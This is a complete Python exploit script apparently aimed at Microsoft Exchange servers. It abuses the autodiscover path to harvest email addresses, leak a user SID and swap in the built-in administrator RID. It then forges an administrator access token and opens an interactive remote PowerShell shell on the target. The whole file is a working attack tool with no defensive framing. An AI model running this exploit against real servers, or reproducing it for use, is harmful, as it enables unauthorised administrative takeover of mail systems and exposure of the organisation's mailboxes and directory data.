#!/usr/bin/env python3

import sys
import urllib3
import requests
from re import findall
from struct import pack
from base64 import b64encode

from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan


urllib3.disable_warnings()
req = requests.session()

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"

def getMail(target):
    eb_headers = {
        "User-Agent": user_agent,
        "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
        "Content-Type": "text/xml",
    }
    ews_data = """<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
        >
            <soap:Body>
                <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
                    <m:UnresolvedEntry>smtp</m:UnresolvedEntry>
                </m:ResolveNames>
            </soap:Body>
        </soap:Envelope>
    """
    resb = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/ews/exchange.asmx", headers=eb_headers, data=ews_data, verify=False)
    email_list = findall("(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)", resb.text)

    with open("users.txt") as filei:
        users_list = filei.read().splitlines()
    try:
        domain = resb.headers["X-CalculatedBETarget"].split('.',1)[1]
        print(f"[+] Domain: {domain}")

        for user in users_list:
            email_list.append(f"{user}@{domain}")
    except KeyError:
        print("[-] No X-CalculatedBETarget")

    return email_list

def getToken(uname, sid):
    version = 0
    ttype = "Windows"
    compressed = 0
    auth_type = "Kerberos"
    raw_token = b""
    gsid = "S-1-5-32-544"
    # gsid = "S-1-5-32-545"

    version_data = b'V' + (1).to_bytes(1, "little") + (version).to_bytes(1, "little")
    type_data = b'T' + (len(ttype)).to_bytes(1, "little") + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, "little")
    auth_data = b'A' + (len(auth_type)).to_bytes(1, "little") + auth_type.encode()
    login_data = b'L' + (len(uname)).to_bytes(1, "little") + uname.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, "little") + sid.encode()
    group_data = b'G' + pack("<II", 1, 7) + (len(gsid)).to_bytes(1, "little") + gsid.encode()
    ext_data = b'E' + pack(">I", 0)

    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data

    return b64encode(raw_token).decode()

def exploit(target):
    try:
        print(f"[*] Target: {target}")

        ua_headers = {
            "User-Agent": user_agent,
        }
        resa = req.get(url=f"{target}/owa/any", headers=ua_headers, verify=False, allow_redirects=False)
        try:
            computer = resa.headers["X-FEServer"]
        except KeyError:
            print("[-] No X-FEServer")
            exit(0)
        print(f"[+] ComputerName: {computer}")

        email_list = getMail(target)
        email_num = len(email_list)
        if email_num > 0:
            print(f"[+] GetUsers: {email_num}")
        else:
            print("[-] No User")
            exit(0)

        email_list_num = len(email_list)
        for i in range(email_list_num+1):
            try:
                usera = email_list[i]
            except IndexError:
                print("[-] No LegacyDN")
                exit(0)

            legacydn = ""
            autodiscover_data = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                <Request>
                    <EMailAddress>{usera}</EMailAddress>
                    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
                </Request>
            </Autodiscover>"""
            ec_headers = {
                "User-Agent": user_agent,
                "Cookie": "email=autodiscover.json/@gmail.com",
                "Content-Type": "text/xml",
            }
            resc = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
            if "DisplayName" in resc.text:
                legacydn = findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
                print(f"[+] LegacyDN: {legacydn[0]}")
                break

        ed_headers = {
            "User-Agent": user_agent,
            "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
            "X-Requesttype": "Connect",
            "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
            "X-Clientinfo": "{2EF33C39-49C8-421C-B876-CDF7F2AC3AA0}:123",
            "X-Clientapplication": "Outlook/15.0.4815.1002",
            "Content-Type": "application/mapi-http",
        }
        mapi_data = f"{legacydn[0]}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        resd = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/mapi/emsmdb?MailboxId=gmail.com", headers=ed_headers, data=mapi_data, verify=False)
        try:
            sid = resd.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
            print(f"[+] Origin SID: {sid}")
        except IndexError:
            print("[-] No SID")
            exit(0)

        sid_rid = sid.rsplit('-', 1)
        if sid_rid[1] != "500":
            sid = sid_rid[0] + "-500"
        print(f"[+] Fixed SID: {sid}")

        token = getToken(usera, sid)
        print(f"[+] CommonAccessToken: {token}")
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        exit(0)

    return usera, sid, token

def execmdlet(server, token, **kwargs):
    wsman = WSMan(
        server=server, port=443, cert_validation=False,
        path=f"/autodiscover/autodiscover.json/@gmail.com/powershell?email=autodiscover/autodiscover.json/@gmail.com&X-Rps-CAT={token}"
    )
    with wsman, RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        ps = PowerShell(pool)
        ps.add_script(kwargs["pscript"])
        ps.invoke()

        if len(ps.output) > 0:
            stdout = "\n".join(str(line) for line in ps.output)
            print(stdout)
        else:
            stderr = "\n".join(str(line) for line in ps.streams.error)
            print(stderr)

def main(argv):
    server = argv[1]
    target = f"https://{server}"

    usera, sid, token = exploit(target)
    while True:
        pscript = input("\033[92mEPS> \033[0m")
        if "exit" == pscript:
            exit(0)
        execmdlet(server, token, pscript=pscript)


if __name__ == "__main__":
    try:
        main(sys.argv)
    except IndexError:
        print("Usage: python3 34473.py 1.1.1.1")